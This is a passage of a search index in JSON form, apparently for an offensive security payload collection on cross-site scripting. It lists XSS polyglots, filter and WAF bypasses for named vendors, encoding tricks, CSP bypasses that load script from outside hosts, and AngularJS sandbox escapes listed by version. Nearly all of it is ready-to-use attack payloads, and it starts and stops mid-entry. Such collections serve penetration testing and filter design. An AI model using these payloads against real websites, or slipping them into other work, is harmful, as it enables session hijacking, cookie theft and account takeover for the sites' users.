';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT> \u201c onclick=alert(1)//<button \u2018 onclick=alert(1)//> */ alert(1)// '\">><marquee><img src=x onerror=confirm(1)></marquee>\"></plaintext\\></|\\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->\"></script><script>alert(1)</script>\"><img/id=\"confirm&lpar;1)\"/alt=\"/\"src=\"/\"onerror=eval(id&%23x29;>'\"><img src=\"http://i.imgur.com/P8mL8.jpg\"> javascript://'/</title></style></textarea></script>--><p\" onclick=alert()//>*/alert()/* javascript://--></script></title></style>\"/</textarea>*/<alert()/*' onclick=alert()//>a javascript://</title>\"/</script></style></textarea/-->*/<alert()/*' onclick=alert()//>/ javascript://</title></style></textarea>--></script><a\"//' onclick=alert()//>*/alert()/* javascript://'//\" --></textarea></style></script></title><b onclick= alert()//>*/alert()/* javascript://</title></textarea></style></script --><li '//\" '*/alert()/*', onclick=alert()// javascript:alert()//--></script></textarea></style></title><a\"//' onclick=alert()//>*/alert()/* --></script></title></style>\"/</textarea><a' onclick=alert()//>*/alert()/* /</title/'/</style/</script/</textarea/--><p\" onclick=alert()//>*/alert()/* javascript://--></title></style></textarea></script><svg \"//' onclick=alert()// /</title/'/</style/</script/--><p\" onclick=alert()//>*/alert()/* Polyglot XSS - @s0md3v -->'\"/></sCript><svG x=\">\" onload=(co\\u006efirm)``> <svg%0Ao%00nload=%09((pro\\u006dpt))()// Polyglot XSS - from @filedescriptor's Polyglot Challenge # by crlf javascript:\"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \\\" onmouseover=/*&lt;svg/*/onload=alert()//> # by europa javascript:\"/*'/*`/*\\\" /*</title></style></textarea></noscript></noembed></template></script/-->&lt;svg/onload=/*<html/*/onmouseover=alert()//> # by EdOverflow javascript:\"/*\\\"/*`/*' /*</template></textarea></noembed></noscript></title></style></script>-->&lt;svg onload=/*<html/*/onmouseover=alert()//> # by h1/ragnar javascript:`//\"//\\\"//</title></textarea></style></noscript></noembed></script></template>&lt;svg/onload='/*--><html */ onmouseover=alert()//'>`","title":"Polyglot XSS"},{"location":"XSS%20Injection/#filter-bypass-and-exotic-payloads","text":"","title":"Filter Bypass and exotic payloads"},{"location":"XSS%20Injection/#bypass-case-sensitive","text":"<sCrIpt>alert(1)</ScRipt>","title":"Bypass case sensitive"},{"location":"XSS%20Injection/#bypass-tag-blacklist","text":"<script x> <script x>alert('XSS')<script y>","title":"Bypass tag blacklist"},{"location":"XSS%20Injection/#bypass-word-blacklist-with-code-evaluation","text":"eval('ale'+'rt(0)'); Function(\"ale\"+\"rt(1)\")(); new Function`al\\ert\\`6\\``; setTimeout('ale'+'rt(2)'); setInterval('ale'+'rt(10)'); Set.constructor('ale'+'rt(13)')(); Set.constructor`al\\x65rt\\x2814\\x29```;","title":"Bypass word blacklist with code evaluation"},{"location":"XSS%20Injection/#bypass-with-incomplete-html-tag","text":"Works on IE/Firefox/Chrome/Safari <img src='1' onerror='alert(0)' <","title":"Bypass with incomplete html tag"},{"location":"XSS%20Injection/#bypass-quotes-for-string","text":"String.fromCharCode(88,83,83)","title":"Bypass quotes for string"},{"location":"XSS%20Injection/#bypass-quotes-in-script-tag","text":"http://localhost/bla.php?test=</script><script>alert(1)</script> <html> <script> <?php echo 'foo=\"text '.$_GET['test'].'\";';`?> </script> </html>","title":"Bypass quotes in script tag"},{"location":"XSS%20Injection/#bypass-quotes-in-mousedown-event","text":"You can bypass a single quote with ' in an on mousedown event handler <a href=\"\" onmousedown=\"var name = '&#39;;alert(1)//'; alert('smthg')\">Link</a>","title":"Bypass quotes in mousedown event"},{"location":"XSS%20Injection/#bypass-dot-filter","text":"<script>window['alert'](document['domain'])</script> Convert IP address into decimal format: IE. http://192.168.1.1 == http://3232235777 http://www.geektools.com/cgi-bin/ipconv.cgi <script>eval(atob(\"YWxlcnQoZG9jdW1lbnQuY29va2llKQ==\"))<script> Base64 encoding your XSS payload with Linux command: IE. echo -n \"alert(document.cookie)\" | base64 == YWxlcnQoZG9jdW1lbnQuY29va2llKQ==","title":"Bypass dot filter"},{"location":"XSS%20Injection/#bypass-parenthesis-for-string","text":"alert`1` setTimeout`alert\\u0028document.domain\\u0029`;","title":"Bypass parenthesis for string"},{"location":"XSS%20Injection/#bypass-parenthesis-and-semi-colon","text":"// From @garethheyes <script>onerror=alert;throw 1337</script> <script>{onerror=alert}throw 1337</script> <script>throw onerror=alert,'some string',123,'haha'</script> // From @terjanq <script>throw/a/,Uncaught=1,g=alert,a=URL+0,onerror=eval,/1/g+a[12]+[1337]+a[13]</script> // From @cgvwzq <script>TypeError.prototype.name ='=/',0[onerror=eval]['/-alert(1)//']</script>","title":"Bypass parenthesis and semi colon"},{"location":"XSS%20Injection/#bypass-onxxxx-blacklist","text":"<object onafterscriptexecute=confirm(0)> <object onbeforescriptexecute=confirm(0)> // Bypass onxxx= filter with a null byte/vertical tab <img src='1' onerror\\x00=alert(0) /> <img src='1' onerror\\x0b=alert(0) /> // Bypass onxxx= filter with a '/' <img src='1' onerror/=alert(0) />","title":"Bypass onxxxx= blacklist"},{"location":"XSS%20Injection/#bypass-space-filter","text":"// Bypass space filter with \"/\" <img/src='1'/onerror=alert(0)> // Bypass space filter with 0x0c/^L <svg onload = alert(1) > $ echo \"<svg^Lonload^L=^Lalert(1)^L>\" | xxd 00000000: 3c73 7667 0c6f 6e6c 6f61 640c 3d0c 616c <svg.onload.=.al 00000010: 6572 7428 3129 0c3e 0a ert(1).>.","title":"Bypass space filter"},{"location":"XSS%20Injection/#bypass-email-filter","text":"( RFC compliant ) \"><svg/onload=confirm(1)>\"@x.y","title":"Bypass email filter"},{"location":"XSS%20Injection/#bypass-document-blacklist","text":"<div id = \"x\"></div><script>alert(x.parentNode.parentNode.parentNode.location)</script> window[\"doc\"+\"ument\"]","title":"Bypass document blacklist"},{"location":"XSS%20Injection/#bypass-using-javascript-inside-a-string","text":"<script> foo=\"text </script><script>alert(1)</script>\"; </script>","title":"Bypass using javascript inside a string"},{"location":"XSS%20Injection/#bypass-using-an-alternate-way-to-redirect","text":"location=\"http://google.com\" document.location = \"http://google.com\" document.location.href=\"http://google.com\" window.location.assign(\"http://google.com\") window['location']['href']=\"http://google.com\"","title":"Bypass using an alternate way to redirect"},{"location":"XSS%20Injection/#bypass-using-an-alternate-way-to-execute-an-alert","text":"From @brutelogic tweet. window['alert'](0) parent['alert'](1) self['alert'](2) top['alert'](3) this['alert'](4) frames['alert'](5) content['alert'](6) [7].map(alert) [8].find(alert) [9].every(alert) [10].filter(alert) [11].findIndex(alert) [12].forEach(alert); From @theMiddle - Using global variables The Object.keys() method returns an array of a given object's own property names, in the same order as we get with a normal loop. That's means that we can access any JavaScript function by using its index number instead the function name . c=0; for(i in self) { if(i == \"alert\") { console.log(c); } c++; } // 5 Then calling alert is : Object.keys(self)[5] // \"alert\" self[Object.keys(self)[5]](\"1\") // alert(\"1\") We can find \"alert\" with a regular expression like ^a[rel]+t$ : a=()=>{c=0;for(i in self){if(/^a[rel]+t$/.test(i)){return c}c++}} //bind function alert on new function a() // then you can use a() with Object.keys self[Object.keys(self)[a()]](\"1\") // alert(\"1\") Oneliner: a=()=>{c=0;for(i in self){if(/^a[rel]+t$/.test(i)){return c}c++}};self[Object.keys(self)[a()]](\"1\") From @quanyang tweet. prompt`${document.domain}` document.location='java\\tscript:alert(1)' document.location='java\\rscript:alert(1)' document.location='java\\tscript:alert(1)' From @404death tweet. eval('ale'+'rt(0)'); Function(\"ale\"+\"rt(1)\")(); new Function`al\\ert\\`6\\``; constructor.constructor(\"aler\"+\"t(3)\")(); [].filter.constructor('ale'+'rt(4)')(); top[\"al\"+\"ert\"](5); top[8680439..toString(30)](7); top[/al/.source+/ert/.source](8); top['al\\x65rt'](9); open('java'+'script:ale'+'rt(11)'); location='javascript:ale'+'rt(12)'; setTimeout`alert\\u0028document.domain\\u0029`; setTimeout('ale'+'rt(2)'); setInterval('ale'+'rt(10)'); Set.constructor('ale'+'rt(13)')(); Set.constructor`al\\x65rt\\x2814\\x29```; Bypass using an alternate way to trigger an alert var i = document.createElement(\"iframe\"); i.onload = function(){ i.contentWindow.alert(1); } document.appendChild(i); // Bypassed security XSSObject.proxy = function (obj, name, report_function_name, exec_original) { var proxy = obj[name]; obj[name] = function () { if (exec_original) { return proxy.apply(this, arguments); } }; XSSObject.lockdown(obj, name); }; XSSObject.proxy(window, 'alert', 'window.alert', false);","title":"Bypass using an alternate way to execute an alert"},{"location":"XSS%20Injection/#bypass-using-nothing","text":"You don't need to close your tags. <svg onload=alert(1)//","title":"Bypass \"&gt;\" using nothing"},{"location":"XSS%20Injection/#bypass-and-using-and","text":"Unicode Character U+FF1C and U+FF1E \uff1cscript/src=//evil.site/poc.js\uff1e","title":"Bypass \"&lt;\" and \"&gt;\" using \uff1c and \uff1e"},{"location":"XSS%20Injection/#bypass-using-another-character","text":"'te' * alert('*') * 'xt'; 'te' / alert('/') / 'xt'; 'te' % alert('%') % 'xt'; 'te' - alert('-') - 'xt'; 'te' + alert('+') + 'xt'; 'te' ^ alert('^') ^ 'xt'; 'te' > alert('>') > 'xt'; 'te' < alert('<') < 'xt'; 'te' == alert('==') == 'xt'; 'te' & alert('&') & 'xt'; 'te' , alert(',') , 'xt'; 'te' | alert('|') | 'xt'; 'te' ? alert('ifelsesh') : 'xt'; 'te' in alert('in') in 'xt'; 'te' instanceof alert('instanceof') instanceof 'xt';","title":"Bypass \";\" using another character"},{"location":"XSS%20Injection/#bypass-using-html-encoding","text":"%26%2397;lert(1) &#97;&#108;&#101;&#114;&#116; ></script><svg onload=%26%2397%3B%26%23108%3B%26%23101%3B%26%23114%3B%26%23116%3B(document.domain)>","title":"Bypass using HTML encoding"},{"location":"XSS%20Injection/#bypass-using-katana","text":"Using the Katakana library. javascript:([,\u30a6,,,,\u30a2]=[]+{},[\u30cd,\u30db,\u30cc,\u30bb,,\u30df,\u30cf,\u30d8,,,\u30ca]=[!!\u30a6]+!\u30a6+\u30a6.\u30a6)[\u30c4=\u30a2+\u30a6+\u30ca+\u30d8+\u30cd+\u30db+\u30cc+\u30a2+\u30cd+\u30a6+\u30db][\u30c4](\u30df+\u30cf+\u30bb+\u30db+\u30cd+'(-~\u30a6)')()","title":"Bypass using Katana"},{"location":"XSS%20Injection/#bypass-using-cuneiform","text":"\ud808\udc00='',\ud808\ude7a=!\ud808\udc00+\ud808\udc00,\ud808\udc03=!\ud808\ude7a+\ud808\udc00,\ud808\uddfa=\ud808\udc00+{},\ud808\udf10=\ud808\ude7a[\ud808\udc00++], \ud808\udc1f=\ud808\ude7a[\ud808\ude2b=\ud808\udc00],\ud808\udc06=++\ud808\ude2b+\ud808\udc00,\ud808\udc79=\ud808\uddfa[\ud808\ude2b+\ud808\udc06],\ud808\ude7a[\ud808\udc79+=\ud808\uddfa[\ud808\udc00] +(\ud808\ude7a.\ud808\udc03+\ud808\uddfa)[\ud808\udc00]+\ud808\udc03[\ud808\udc06]+\ud808\udf10+\ud808\udc1f+\ud808\ude7a[\ud808\ude2b]+\ud808\udc79+\ud808\udf10+\ud808\uddfa[\ud808\udc00] +\ud808\udc1f][\ud808\udc79](\ud808\udc03[\ud808\udc00]+\ud808\udc03[\ud808\ude2b]+\ud808\ude7a[\ud808\udc06]+\ud808\udc1f+\ud808\udf10+\"(\ud808\udc00)\")()","title":"Bypass using Cuneiform"},{"location":"XSS%20Injection/#bypass-using-lontara","text":"\u1a06='',\u1a0a=!\u1a06+\u1a06,\u1a0e=!\u1a0a+\u1a06,\u1a02=\u1a06+{},\u1a07=\u1a0a[\u1a06++],\u1a0b=\u1a0a[\u1a0f=\u1a06],\u1a03=++\u1a0f+\u1a06,\u1a05=\u1a02[\u1a0f+\u1a03],\u1a0a[\u1a05+=\u1a02[\u1a06]+(\u1a0a.\u1a0e+\u1a02)[\u1a06]+\u1a0e[\u1a03]+\u1a07+\u1a0b+\u1a0a[\u1a0f]+\u1a05+\u1a07+\u1a02[\u1a06]+\u1a0b][\u1a05](\u1a0e[\u1a06]+\u1a0e[\u1a0f]+\u1a0a[\u1a03]+\u1a0b+\u1a07+\"(\u1a06)\")() More alphabets on http://aem1k.com/aurebesh.js/#","title":"Bypass using Lontara"},{"location":"XSS%20Injection/#bypass-using-ecmascript6","text":"<script>alert&DiacriticalGrave;1&DiacriticalGrave;</script>","title":"Bypass using ECMAScript6"},{"location":"XSS%20Injection/#bypass-using-octal-encoding","text":"javascript:'\\74\\163\\166\\147\\40\\157\\156\\154\\157\\141\\144\\75\\141\\154\\145\\162\\164\\50\\61\\51\\76'","title":"Bypass using Octal encoding"},{"location":"XSS%20Injection/#bypass-using-unicode","text":"Unicode character U+FF1C FULLWIDTH LESS\u00adTHAN SIGN (encoded as %EF%BC%9C) was transformed into U+003C LESS\u00adTHAN SIGN (<) Unicode character U+02BA MODIFIER LETTER DOUBLE PRIME (encoded as %CA%BA) was transformed into U+0022 QUOTATION MARK (\") Unicode character U+02B9 MODIFIER LETTER PRIME (encoded as %CA%B9) was transformed into U+0027 APOSTROPHE (') E.g : http://www.example.net/something%CA%BA%EF%BC%9E%EF%BC%9Csvg%20onload=alert%28/XSS/%29%EF%BC%9E/ %EF%BC%9E becomes > %EF%BC%9C becomes < Bypass using Unicode converted to uppercase \u0130 (%c4%b0).toLowerCase() => i \u0131 (%c4%b1).toUpperCase() => I \u017f (%c5%bf) .toUpperCase() => S \u212a (%E2%84%AA).toLowerCase() => k <\u017fvg onload=... > become <SVG ONLOAD=...> <\u0131frame id=x onload=>.toUpperCase() become <IFRAME ID=X ONLOAD=>","title":"Bypass using Unicode"},{"location":"XSS%20Injection/#bypass-using-utf-7","text":"+ADw-img src=+ACI-1+ACI- onerror=+ACI-alert(1)+ACI- /+AD4-","title":"Bypass using UTF-7"},{"location":"XSS%20Injection/#bypass-using-utf-8","text":"< = %C0%BC = %E0%80%BC = %F0%80%80%BC > = %C0%BE = %E0%80%BE = %F0%80%80%BE ' = %C0%A7 = %E0%80%A7 = %F0%80%80%A7 \" = %C0%A2 = %E0%80%A2 = %F0%80%80%A2 \" = %CA%BA ' = %CA%B9","title":"Bypass using UTF-8"},{"location":"XSS%20Injection/#bypass-using-utf-16be","text":"%00%3C%00s%00v%00g%00/%00o%00n%00l%00o%00a%00d%00=%00a%00l%00e%00r%00t%00(%00)%00%3E%00 \\x00<\\x00s\\x00v\\x00g\\x00/\\x00o\\x00n\\x00l\\x00o\\x00a\\x00d\\x00=\\x00a\\x00l\\x00e\\x00r\\x00t\\x00(\\x00)\\x00>","title":"Bypass using UTF-16be"},{"location":"XSS%20Injection/#bypass-using-utf-32","text":"%00%00%00%00%00%3C%00%00%00s%00%00%00v%00%00%00g%00%00%00/%00%00%00o%00%00%00n%00%00%00l%00%00%00o%00%00%00a%00%00%00d%00%00%00=%00%00%00a%00%00%00l%00%00%00e%00%00%00r%00%00%00t%00%00%00(%00%00%00)%00%00%00%3E","title":"Bypass using UTF-32"},{"location":"XSS%20Injection/#bypass-using-bom","text":"Byte Order Mark (The page must begin with the BOM character.) BOM character allows you to override charset of the page BOM Character for UTF-16 Encoding: Big Endian : 0xFE 0xFF Little Endian : 0xFF 0xFE XSS : %fe%ff%00%3C%00s%00v%00g%00/%00o%00n%00l%00o%00a%00d%00=%00a%00l%00e%00r%00t%00(%00)%00%3E BOM Character for UTF-32 Encoding: Big Endian : 0x00 0x00 0xFE 0xFF Little Endian : 0xFF 0xFE 0x00 0x00 XSS : %00%00%fe%ff%00%00%00%3C%00%00%00s%00%00%00v%00%00%00g%00%00%00/%00%00%00o%00%00%00n%00%00%00l%00%00%00o%00%00%00a%00%00%00d%00%00%00=%00%00%00a%00%00%00l%00%00%00e%00%00%00r%00%00%00t%00%00%00(%00%00%00)%00%00%00%3E","title":"Bypass using BOM"},{"location":"XSS%20Injection/#bypass-using-weird-encoding-or-native-interpretation","text":"<script>\\u0061\\u006C\\u0065\\u0072\\u0074(1)</script> <img src=\"1\" onerror=\"&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;\" /> <iframe src=\"javascript:%61%6c%65%72%74%28%31%29\"></iframe> <script>$=~[];$={___:++$,$$$$:(![]+\"\")[$],__$:++$,$_$_:(![]+\"\")[$],_$_:++$,$_$$:({}+\"\")[$],$$_$:($[$]+\"\")[$],_$$:++$,$$$_:(!\"\"+\"\")[$],$__:++$,$_$:++$,$$__:({}+\"\")[$],$$_:++$,$$$:++$,$___:++$,$__$:++$};$.$_=($.$_=$+\"\")[$.$_$]+($._$=$.$_[$.__$])+($.$$=($.$+\"\")[$.__$])+((!$)+\"\")[$._$$]+($.__=$.$_[$.$$_])+($.$=(!\"\"+\"\")[$.__$])+($._=(!\"\"+\"\")[$._$_])+$.$_[$.$_$]+$.__+$._$+$.$;$.$$=$.$+(!\"\"+\"\")[$._$$]+$.__+$._+$.$+$.$$;$.$=($.___)[$.$_][$.$_];$.$($.$($.$$+\"\\\"\"+$.$_$_+(![]+\"\")[$._$_]+$.$$$_+\"\\\\\"+$.__$+$.$$_+$._$_+$.__+\"(\"+$.___+\")\"+\"\\\"\")())();</script> <scriptscript>","title":"Bypass using weird encoding or native interpretation"},{"location":"XSS%20Injection/#bypass-using-jsfuck","text":"Bypass using jsfucktitle":"Bypass using jsfuck"},{"location":"XSS%20Injection/#csp-bypass","text":"Check the CSP on https://csp-evaluator.withgoogle.com and the post : How to use Google\u2019s CSP Evaluator to bypass CSP","title":"CSP Bypass"},{"location":"XSS%20Injection/#bypass-csp-using-jsonp-from-google-trick-by-apfeifer27","text":"//google.com/complete/search?client=chrome&jsonp=alert(1); <script/src=//google.com/complete/search?client=chrome%26jsonp=alert(1);>\" More JSONP endpoints: * /Intruders/jsonp_endpoint.txt * JSONBee/jsonp.txt","title":"Bypass CSP using JSONP from Google (Trick by @apfeifer27)"},{"location":"XSS%20Injection/#bypass-csp-by-labwallarmcom","text":"Works for CSP like Content-Security-Policy: default-src 'self' 'unsafe-inline'; , POC here script=document.createElement('script'); script.src='//bo0om.ru/csp.js'; window.frames[0].document.head.appendChild(script);","title":"Bypass CSP by lab.wallarm.com"},{"location":"XSS%20Injection/#bypass-csp-by-rhynorater","text":"// CSP Bypass with Inline and Eval d=document;f=d.createElement(\"iframe\");f.src=d.querySelector('link[href*=\".css\"]').href;d.body.append(f);s=d.createElement(\"script\");s.src=\"https://[YOUR_XSSHUNTER_USERNAME].xss.ht\";setTimeout(function(){f.contentWindow.document.head.append(s);},1000)","title":"Bypass CSP by Rhynorater"},{"location":"XSS%20Injection/#bypass-csp-by-akita_zen","text":"Works for CSP like script-src self <object data=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\"></object>","title":"Bypass CSP by @akita_zen"},{"location":"XSS%20Injection/#bypass-csp-by-404death","text":"Works for CSP like script-src 'self' data: as warned about in the official mozilla documentation . <script src=\"data:,alert(1)\">/</script>","title":"Bypass CSP by @404death"},{"location":"XSS%20Injection/#common-waf-bypass","text":"","title":"Common WAF Bypass"},{"location":"XSS%20Injection/#cloudflare-xss-bypasses-by-bohdan-korzhynskyi","text":"","title":"Cloudflare XSS Bypasses by @Bohdan Korzhynskyi"},{"location":"XSS%20Injection/#25st-january-2021","text":"<svg/onrandom=random onload=confirm(1)> <video onnull=null onmouseover=confirm(1)>","title":"25st January 2021"},{"location":"XSS%20Injection/#21st-april-2020","text":"<svg/OnLoad=\"`${prompt``}`\">","title":"21st April 2020"},{"location":"XSS%20Injection/#22nd-august-2019","text":"<svg/onload=%26nbsp;alert`bohdan`+","title":"22nd August 2019"},{"location":"XSS%20Injection/#5th-june-2019","text":"1'\"><img/src/onerror=.1|alert``>","title":"5th June 2019"},{"location":"XSS%20Injection/#3rd-june-2019","text":"<svg onload=prompt%26%230000000040document.domain)> <svg onload=prompt%26%23x000000028;document.domain)> xss'\"><iframe srcdoc='%26lt;script>;prompt`${document.domain}`%26lt;/script>'>","title":"3rd June 2019"},{"location":"XSS%20Injection/#cloudflare-xss-bypass-22nd-march-2019-by-rakeshmane10","text":"<svg/onload=&#97&#108&#101&#114&#00116&#40&#41&#x2f&#x2f","title":"Cloudflare XSS Bypass - 22nd March 2019 (by @RakeshMane10)"},{"location":"XSS%20Injection/#cloudflare-xss-bypass-27th-february-2018","text":"<a href=\"j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;&lpar;a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;(document.domain)&rpar;\">X</a>","title":"Cloudflare XSS Bypass - 27th February 2018"},{"location":"XSS%20Injection/#chrome-auditor-9th-august-2018","text":"</script><svg><script>alert(1)-%26apos%3B Live example by @brutelogic - https://brutelogic.com.br/xss.php","title":"Chrome Auditor - 9th August 2018"},{"location":"XSS%20Injection/#incapsula-waf-bypass-by-alra3ees-8th-march-2018","text":"anythinglr00</script><script>alert(document.domain)</script>uxldz anythinglr00%3c%2fscript%3e%3cscript%3ealert(document.domain)%3c%2fscript%3euxldz","title":"Incapsula WAF Bypass by @Alra3ees- 8th March 2018"},{"location":"XSS%20Injection/#incapsula-waf-bypass-by-c0d3g33k-11th-september-2018","text":"<object data='data:text/html;;;;;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='></object>","title":"Incapsula WAF Bypass by @c0d3G33k - 11th September 2018"},{"location":"XSS%20Injection/#incapsula-waf-bypass-by-daveysec-11th-may-2019","text":"<svg onload\\r\\n=$.globalEval(\"al\"+\"ert()\");>","title":"Incapsula WAF Bypass by @daveysec - 11th May 2019"},{"location":"XSS%20Injection/#akamai-waf-bypass-by-zseano-18th-june-2018","text":"?\"></script><base%20c%3D=href%3Dhttps:\\mysite>","title":"Akamai WAF Bypass by @zseano - 18th June 2018"},{"location":"XSS%20Injection/#akamai-waf-bypass-by-s0md3v-28th-october-2018","text":"<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a() x>","title":"Akamai WAF Bypass by @s0md3v - 28th October 2018"},{"location":"XSS%20Injection/#wordfence-waf-bypass-by-brutelogic-12th-september-2018","text":"<a href=javas&#99;ript:alert(1)>","title":"WordFence WAF Bypass by @brutelogic - 12th September 2018"},{"location":"XSS%20Injection/#fortiweb-waf-bypass-by-rezaduty-9th-july-2019","text":"\\u003e\\u003c\\u0068\\u0031 onclick=alert('1')\\u003e","title":"Fortiweb WAF Bypass by @rezaduty - 9th July 2019"},{"location":"XSS%20Injection/#references","text":"Unleashing-an-Ultimate-XSS-Polyglot tbm (Relative Path Overwrite) RPO XSS - Infinite Security RPO TheSpanner RPO Gadget - innerthmtl Relative Path Overwrite - Detectify XSS ghettoBypass - d3adend XSS without HTML: Client-Side Template Injection with AngularJS XSSING WEB PART - 2 - Rakesh Mane Making an XSS triggered by CSP bypass on Twitter. @tbmnull Ways to alert(document.domain) - @tomnomnom D1T1 - Michele Spagnuolo and Lukas Wilschelbaum - So We Broke All CSPs Sleeping stored Google XSS Awakens a $5000 Bounty by Patrik Fehrenbach RPO that lead to information leakage in Google by filedescriptor God-like XSS, Log-in, Log-out, Log-in in Uber by Jack Whitton Three Stored XSS in Facebook by Nirgoldshlager Using a Braun Shaver to Bypass XSS Audit and WAF by Frans Rosen An XSS on Facebook via PNGs & Wonky Content Types by Jack Whitton Stored XSS in *.ebay.com by Jack Whitton Complicated, Best Report of Google XSS by Ramzes Tricky Html Injection and Possible XSS in sms-be-vip.twitter.com by secgeek Command Injection in Google Console by Venkat S Facebook's Moves - OAuth XSS by PAULOS YIBELO Stored XSS in Google Docs (Bug Bounty) by Harry M Gertos Stored XSS on developer.uber.com via admin account compromise in Uber by James Kettle (albinowax) Yahoo Mail stored XSS by Klikki Oy Abusing XSS Filter: One ^ leads to XSS(CVE-2016-3212) by Masato Kinugawa Youtube XSS by fransrosen Best Google XSS again - by Krzysztof Kotowicz IE & Edge URL parsing Problem - by detectify Google XSS subdomain Clickjacking Microsoft XSS and Twitter XSS Google Japan Book XSS Flash XSS mega nz - by frans Flash XSS in multiple libraries - by Olivier Beg xss in google IE, Host Header Reflection Years ago Google xss xss in google by IE weird behavior xss in Yahoo Fantasy Sport xss in Yahoo Mail Again, worth $10000 by Klikki Oy Sleeping XSS in Google by securityguard Decoding a .htpasswd to earn a payload of money by securityguard Google Account Takeover AirBnb Bug Bounty: Turning Self-XSS into Good-XSS #2 by geekboy Uber Self XSS to Global XSS How I found a $5,000 Google Maps XSS (by fiddling with Protobuf) by Marin MoulinierFollow Airbnb \u2013 When Bypassing JSON Encoding, XSS Filter, WAF, CSP, and Auditor turns into Eight Vulnerabilities by Brett XSSI, Client Side Brute Force postMessage XSS on a million sites - December 15, 2016 - Mathias Karlsson postMessage XSS Bypass XSS in Uber via Cookie by zhchbin Stealing contact form data on www.hackerone.com using Marketo Forms XSS with postMessage frame-jumping and jQuery-JSONP by frans XSS due to improper regex in third party js Uber 7k XSS XSS in TinyMCE 2.4.0 by Jelmer de Hen Pass uncoded URL in IE11 to cause XSS Twitter XSS by stopping redirection and javascript scheme by Sergey Bobrov Auth DOM Uber XSS Managed Apps and Music: two Google reflected XSSes App Maker and Colaboratory: two Google stored XSSes XSS in www.yahoo.com Stored XSS, and SSRF in Google using the Dataset Publishing Language Stored XSS on Snapchat XSS cheat sheet - PortSwigger mXSS Attacks: Attacking well-secured Web-Applications by using innerHTML Mutations - Mario Heiderich, J\u00f6rg Schwenk, Tilman Frosch, Jonas Magazinius, Edward Z. Yang Self Closing Script Bypass < with \uff1c Bypassing Signature-Based XSS Filters: Modifying Script Code","title":"References"},{"location":"XSS%20Injection/XSS%20in%20Angular/","text":"XSS in Angular and AngularJS Client Side Template Injection The following payloads are based on Client Side Template Injection. Stored/Reflected XSS - Simple alert in AngularJS AngularJS as of version 1.6 have removed the sandbox altogether AngularJS 1.6+ by Mario Heiderich {{constructor.constructor('alert(1)')()}} AngularJS 1.6+ by @brutelogic {{[].pop.constructor&#40'alert\\u00281\\u0029'&#41&#40&#41}} Example available at https://brutelogic.com.br/xss.php AngularJS 1.6.0 by @LewisArdern & @garethheyes {{0[a='constructor'][a]('alert(1)')()}} {{$eval.constructor('alert(1)')()}} {{$on.constructor('alert(1)')()}} AngularJS 1.5.9 - 1.5.11 by Jan Horn {{ c=''.sub.call;b=''.sub.bind;a=''.sub.apply; c.$apply=$apply;c.$eval=b;op=$root.$$phase; $root.$$phase=null;od=$root.$digest;$root.$digest=({}).toString; C=c.$apply(c);$root.$$phase=op;$root.$digest=od; B=C(b,c,b);$evalAsync(\" astNode=pop();astNode.type='UnaryExpression'; astNode.operator='(window.X?void0:(window.X=true,alert(1)))+'; astNode.argument={type:'Identifier',name:'foo'}; \"); m1=B($$asyncQueue.pop().expression,null,$root); m2=B(C,null,m1);[].push.apply=m2;a=''.sub; $eval('a(b.c)');[].push.apply=a; }} AngularJS 1.5.0 - 1.5.8 {{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(1)');}} AngularJS 1.4.0 - 1.4.9 {{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}} AngularJS 1.3.20 {{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}} AngularJS 1.3.19 {{ 'a'[{toString:false,valueOf:[].join,length:1,0:'__proto__'}].charAt=[].join; $eval('x=alert(1)//'); }} AngularJS 1.3.3 - 1.3.18 {{{}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join; 'a'.constructor.prototype.charAt=[].join; $eval('x=alert(1)//'); }} AngularJS 1.3.1 - 1.3.2 {{ {}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join; 'a'.constructor.prototype.charAt=''.valueOf; $eval('x=alert(1)//'); }} AngularJS 1.3.0 {{!ready && (ready = true) && ( !call ? $$watchers[0].get(toString.constructor.prototype) : (a = apply) && (apply = constructor) && (valueOf = call) && (''+''.toString( 'F = Function.prototype;' + 'F.apply = F.a;' + 'delete F.a;' + 'delete F.valueOf;' + 'alert(1);' )) );}} AngularJS 1.2.24 - 1.2.29 {{'a'.constructor.prototype.charAt=''.valueOf;$eval(\"x='\\\"+(y='if(!window\\\\u002ex)alert(window\\\\u002ex=1)')+eval(y)+\\\"'\");}} AngularJS 1.2.19 - 1.2.23 {{toString.constructor.prototype.toString=toString.constructor.prototype.call;[\"a\",\"alert(1)\"].sort(toString.constructor);}} AngularJS 1.2.6 - 1.2.18 {{(_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'alert(1)')()}} AngularJS 1.2.2 - 1.2.5 {{'a'[{toString:[].join,length:1,0:'__proto__'}].charAt=''.valueOf;$eval(\"x='\"+(y='if(!window\\\\u002ex)alert(window\\\\u002ex=1)')+eval(y)+\"'\");}} AngularJS 1.2.0 - 1.2.1 {{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()}} AngularJS 1.0.1 - 1.1.5 and Vue JS {{constructor.constructor('alert(1)')()}} Advanced bypassing XSS AngularJS (without ' single and \" double quotes) by @Viren {{x=valueOf.name.constructor.fromCharCode;constructor.constructor(x(97,108,101,114,116,40,49,41))()}} AngularJS (without ' single and \" double quotes and constructor string) 